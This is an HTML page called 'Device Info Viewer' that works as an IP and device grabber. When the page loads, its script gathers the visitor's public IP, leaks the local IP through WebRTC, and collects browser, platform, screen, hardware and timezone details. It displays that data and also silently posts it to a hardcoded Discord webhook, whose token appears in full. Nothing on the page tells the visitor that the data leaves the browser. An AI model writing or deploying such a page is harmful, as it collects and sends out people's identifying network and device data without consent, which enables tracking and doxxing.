<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Info Viewer</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            color: #fff;
            background: url('https://i.pinimg.com/736x/13/ea/e2/13eae248980fd53250e515d9de5d2bef.jpg') no-repeat center center fixed;
            background-size: cover;
            overflow: hidden;
        }

        .info-container {
            text-align: center;
            max-width: 80%;
            background: rgba(0, 0, 0, 0.6);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.8);
        }

        .info {
            font-size: 1.2rem;
            line-height: 1.8rem;
            white-space: pre-wrap;
            overflow-wrap: break-word;
            word-break: break-word;
        }

        footer {
            margin-top: 20px;
            display: flex;
            justify-content: center;
            gap: 20px;
        }

        footer a {
            color: #fff;
            text-decoration: none;
            font-size: 1.2rem;
            padding: 5px 10px;
            border: 1px solid #fff;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.1);
            transition: 0.3s;
        }

        footer a:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        audio {
            display: none;
        }
    </style>
</head>
<body>
    <div class="info-container">
        <div class="info" id="info"></div>
    </div>

    <footer>
        <a href="about.html">About</a>
        <a href="loader.html">Loader</a>
    </footer>

    <audio autoplay loop>
        <source src="https://raw.githubusercontent.com/nawaf12342/downloader/main/downloads/King%20Von%20Anti%20piracy%20screen%20(for%20my%20pc).mp3" type="audio/mpeg">
    </audio>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1318172255200608286/xzs8hCt3pouk1LrrAZHhyQ-n643oDdIGueWgQADWlVfBHxOu3ffLMMAlsSMRy16M4Xau";

        async function getDeviceInfo() {
            const infoContainer = document.getElementById("info");

            // Simulate typing effect
            function typeText(text) {
                return new Promise((resolve) => {
                    let index = 0;
                    const interval = setInterval(() => {
                        if (index < text.length) {
                            infoContainer.textContent += text[index++];
                        } else {
                            clearInterval(interval);
                            resolve();
                        }
                    }, 20);
                });
            }

            // Fetch public IP
            let publicIP = "Unable to retrieve";
            try {
                const ipResponse = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipResponse.json();
                publicIP = ipData.ip;
            } catch {}

            // Get local IP (if possible)
            let localIP = "Not supported";
            try {
                const rtc = new RTCPeerConnection();
                rtc.createDataChannel("");
                rtc.createOffer().then((offer) => rtc.setLocalDescription(offer));
                rtc.onicecandidate = (event) => {
                    if (event && event.candidate && event.candidate.candidate) {
                        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                        const match = ipRegex.exec(event.candidate.candidate);
                        if (match) localIP = match[0];
                    }
                };
            } catch {}

            const deviceInfo = `
Public IP Address: ${publicIP}
Local IP Address: ${localIP}

Browser: ${navigator.userAgent || "Unknown"}
Platform: ${navigator.platform || "Unknown"}
Language: ${navigator.language || "Unknown"}
Screen Resolution: ${screen.width} x ${screen.height}
Available Screen Size: ${screen.availWidth} x ${screen.availHeight}
Color Depth: ${screen.colorDepth}-bit
Pixel Depth: ${screen.pixelDepth}-bit

CPU Threads: ${navigator.hardwareConcurrency || "Unknown"}
Device Memory (GB): ${navigator.deviceMemory || "Unknown"}
Online Status: ${navigator.onLine ? "Online" : "Offline"}
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"}
Locale: ${Intl.DateTimeFormat().resolvedOptions().locale || "Unknown"}

Touch Support: ${
                "ontouchstart" in window || navigator.maxTouchPoints > 0 ? "Yes" : "No"
            }
            `;

            await typeText(deviceInfo.trim());

            // Send data to Discord webhook
            try {
                await fetch(webhookUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        content: `**Device Information**:\n\`\`\`${deviceInfo.trim()}\`\`\``,
                    }),
                });
                console.log("Device info sent to Discord webhook.");
            } catch (error) {
                console.error("Failed to send data to the webhook:", error);
            }
        }

        getDeviceInfo();
    </script>
</body>
</html>
